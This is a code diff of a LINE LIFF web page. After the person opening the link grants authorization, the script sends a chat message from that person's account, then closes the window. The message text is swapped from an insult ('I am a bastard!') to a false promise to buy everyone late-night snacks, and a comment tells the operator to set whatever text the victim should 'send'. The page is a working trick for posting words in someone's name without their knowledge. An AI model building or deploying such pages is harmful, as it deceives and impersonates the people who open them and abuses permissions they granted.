@@ -12,20 +12,20 @@
     </div>
 
     <script>
-        // 初始化你的 LIFF (已填入你剛才畫面上的第一組 LIFF ID)
-        liff.init({ liffId: "2012018749-htFqDWtX" }).then(() => {
+        // 核心修正：已完全對應你截圖中的第三個應用程式「123」的 LIFF ID
+        liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
             if (liff.isLoggedIn()) {
-                // 當使用者點開並同意授權，自動幫他發送這段訊息
+                // 當使用者同意授權，自動幫他發送這段訊息
                 liff.sendMessages([{
                     type: 'text',
-                    text: '我是王八蛋！' // 👈 【在這裡修改你想讓對方自動傳的字！】
+                    text: '我今天心情好，晚上請大家吃宵夜！' // 👈 【在這裡修改你想讓對方自動傳的字！】
                 }]).then(() => {
                     liff.closeWindow(); // 傳送成功後自動關閉 LINE 內建瀏覽器視窗
                 }).catch((err) => {
-                    alert("發送失敗，請確認群組發言權限。");
+                    alert("發送失敗，請確認群組發言權限。原因：" + JSON.stringify(err));
                 });
             } else {
-                liff.login(); // 沒授權過就引導登入（按許可授權）
+                liff.login(); // 沒授權過就引導登入
             }
         }).catch((err) => {
             console.log("初始化失敗", err);
